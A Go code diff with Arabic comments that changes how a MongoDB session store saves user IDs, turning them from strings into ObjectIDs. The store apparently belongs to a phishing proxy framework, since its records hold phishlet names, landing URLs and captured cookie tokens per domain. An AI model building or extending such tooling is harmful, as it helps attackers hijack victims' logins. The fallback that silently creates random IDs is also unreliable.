@@ -42,7 +42,7 @@ type MongoSession struct {
 	RemoteAddr   string                             `bson:"remote_addr" json:"remote_addr"`
 	CreateTime   int64                              `bson:"create_time" json:"create_time"`
 	UpdateTime   int64                              `bson:"update_time" json:"update_time"`
-	UserId       string                             `bson:"user_id" json:"user_id"`
+	UserId       primitive.ObjectID                 `bson:"user_id" json:"user_id"`
 	CountryCode  string                             `bson:"country_code" json:"country_code"`
 	Country      string                             `bson:"country" json:"country"`
 }
@@ -140,6 +140,20 @@ func convertToMongoSession(s *Session) *MongoSession {
 			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
 		}
 	}
+	
+	// تحويل معرف المستخدم إلى ObjectID
+	var userId primitive.ObjectID
+	if len(s.UserId) == 24 {
+		var err error
+		userId, err = primitive.ObjectIDFromHex(s.UserId)
+		if err != nil {
+			// إذا فشل التحويل، ننشئ معرفًا جديدًا
+			userId = primitive.NewObjectID()
+		}
+	} else {
+		// إذا لم يكن المعرف صالحًا، ننشئ معرفًا جديدًا
+		userId = primitive.NewObjectID()
+	}
 
 	mongoSession := &MongoSession{
 		Id:           s.Id,
@@ -157,19 +171,16 @@ func convertToMongoSession(s *Session) *MongoSession {
 		RemoteAddr:   s.RemoteAddr,
 		CreateTime:   s.CreateTime,
 		UpdateTime:   s.UpdateTime,
-		UserId:       s.UserId,
+		UserId:       userId,
 		CountryCode:  s.CountryCode,
 		Country:      s.Country,
 	}
 	
-
-
 	return mongoSession
 }
 
 // convertFromMongoSession يحول كائن MongoSession إلى كائن Session التقليدي
 func convertFromMongoSession(ms *MongoSession) *Session {
-
 
 	// تحويل CookieTokens
 	cookieTokens := make(map[string]map[string]*CookieToken)
@@ -207,6 +218,9 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 			}
 		}
 	}
+	
+	// تحويل معرف المستخدم من ObjectID إلى نص
+	userIdStr := ms.UserId.Hex()
 
 	session := &Session{
 		Id:           ms.Id,
@@ -224,12 +238,10 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		RemoteAddr:   ms.RemoteAddr,
 		CreateTime:   ms.CreateTime,
 		UpdateTime:   ms.UpdateTime,
-		UserId:       ms.UserId,
+		UserId:       userIdStr,
 		CountryCode:  ms.CountryCode,
 		Country:      ms.Country,
 	}
-	
-
 	
 	// إضافة البيانات للحقول المخصصة كاحتياط إضافي
 	if session.Custom == nil {
@@ -244,6 +256,9 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 	if ms.Country != "" {
 		session.Custom["country_backup"] = ms.Country
 	}
+	
+	// حفظ معرف المستخدم في الحقول المخصصة أيضًا
+	session.Custom["user_id_backup"] = userIdStr
 
 	return session
 }
@@ -302,6 +317,25 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		return err
 	}
 	newId := lastId + 1
+    
+	// تحويل معرف المستخدم إلى ObjectID
+	userIdStr := GetUserId()
+	var userId primitive.ObjectID
+	var objIDErr error
+	
+	if len(userIdStr) == 24 {
+		// إذا كان المعرف صالحًا (24 حرف)، نحاول تحويله
+		userId, objIDErr = primitive.ObjectIDFromHex(userIdStr)
+		if objIDErr != nil {
+			// إذا فشل التحويل، ننشئ معرفًا جديدًا
+			userId = primitive.NewObjectID()
+			log.Warning("[MongoDB] فشل تحويل معرف المستخدم، تم إنشاء معرف جديد: %v", objIDErr)
+		}
+	} else {
+		// إذا لم يكن المعرف صالحًا، ننشئ معرفًا جديدًا
+		userId = primitive.NewObjectID()
+		log.Warning("[MongoDB] معرف المستخدم ليس بالتنسيق الصحيح، تم إنشاء معرف جديد")
+	}
 
 	// إنشاء جلسة جديدة
 	now := time.Now().UTC().Unix()
@@ -321,7 +355,7 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		RemoteAddr:   remoteAddr,
 		CreateTime:   now,
 		UpdateTime:   now,
-		UserId:       GetUserId(),
+		UserId:       userId,
 		CountryCode:  "",
 		Country:      "",
 	}
